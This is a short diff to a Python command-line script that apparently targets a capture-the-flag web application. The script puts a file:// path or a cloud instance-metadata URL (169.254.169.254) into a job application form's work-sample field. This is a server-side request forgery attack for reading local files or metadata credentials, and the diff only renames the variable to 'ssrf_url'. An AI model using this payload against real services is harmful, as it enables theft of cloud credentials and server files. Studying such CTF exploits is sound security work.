@@ -10,13 +10,13 @@ import click
 def cli(name: str, api_endpoint: str, file: str):
     url = "https://apply.jackfrosttower.com"
 
-    # Create the file or IMDS URI to retrieve
+    # Create the file or IMDS URL to retrieve
     if file:
         message = f"local file {file}"
-        uri = f"file://{file}"
+        ssrf_url = f"file://{file}"
     else:
         message = f"IMDS {api_endpoint}"
-        uri = f"http://169.254.169.254{api_endpoint}"
+        ssrf_url = f"http://169.254.169.254{api_endpoint}"
 
     # Application form fields
     params = {
@@ -24,7 +24,7 @@ def cli(name: str, api_endpoint: str, file: str):
         'inputEmail': "",
         'inputPhone': "",
         'resumeFile': "",
-        'inputWorkSample': uri,
+        'inputWorkSample': ssrf_url,
         'additionalInformation': "",
         'submit': "",
     }
